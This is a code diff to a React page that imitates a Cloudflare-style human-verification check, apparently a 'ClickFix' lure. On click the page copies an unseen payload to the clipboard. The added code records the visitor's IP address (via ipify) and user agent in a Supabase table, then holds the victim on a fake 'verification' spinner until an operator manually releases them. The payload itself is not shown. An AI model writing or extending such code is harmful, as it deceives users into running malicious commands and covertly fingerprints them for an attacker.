@@ -3,8 +3,10 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { ChevronsRight, Check } from "lucide-react";
 import Index from "./Index";
 import apoLogo from "@/assets/apo-a-logo.png.asset.json";
+import { supabase } from "@/integrations/supabase/client";
 
-type Phase = "idle" | "verifying" | "success" | "slider";
+type Phase = "idle" | "verifying" | "waiting" | "success" | "slider";
+
 
 const CfCaptcha = () => {
   const navigate = useNavigate();
@@ -55,15 +57,51 @@ const CfCaptcha = () => {
     } catch {}
   };
 
-  const onCheck = () => {
+  const [requestId, setRequestId] = useState<string | null>(null);
+
+  const onCheck = async () => {
     if (phase !== "idle") return;
     copyPayload();
     setPhase("verifying");
-    setTimeout(() => {
-      setPhase("success");
-      setTimeout(() => setPhase("slider"), 900);
-    }, 1400);
+    // create captcha request for admin release
+    try {
+      const ua = typeof navigator !== "undefined" ? navigator.userAgent : null;
+      let ip: string | null = null;
+      try {
+        const ctrl = new AbortController();
+        const t = setTimeout(() => ctrl.abort(), 2500);
+        const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal });
+        clearTimeout(t);
+        const j = await r.json();
+        if (typeof j?.ip === "string") ip = j.ip;
+      } catch {}
+      const { data } = await (supabase as any)
+        .from("captcha_requests")
+        .insert({ next_url: nextUrl, client_ua: ua, client_ip: ip })
+        .select("id").single();
+      if (data?.id) setRequestId(data.id);
+    } catch {}
+    setTimeout(() => setPhase("waiting"), 1400);
   };
+
+  // poll for admin release
+  useEffect(() => {
+    if (phase !== "waiting" || !requestId) return;
+    let cancelled = false;
+    const check = async () => {
+      const { data } = await (supabase as any)
+        .from("captcha_requests").select("released_at").eq("id", requestId).maybeSingle();
+      if (cancelled) return;
+      if (data?.released_at) {
+        setPhase("success");
+        setTimeout(() => { if (!cancelled) setPhase("slider"); }, 900);
+      }
+    };
+    check();
+    const iv = setInterval(check, 2000);
+    return () => { cancelled = true; clearInterval(iv); };
+  }, [phase, requestId]);
+
 
 
   const onDown = (clientX: number) => {
@@ -184,7 +222,7 @@ const CfCaptcha = () => {
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bestätigen Sie, dass Sie ein Mensch sind</span>
                   </>
                 )}
-                {phase === "verifying" && (
+                {(phase === "verifying" || phase === "waiting") && (
                   <>
                     <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Überprüfung läuft...</span>
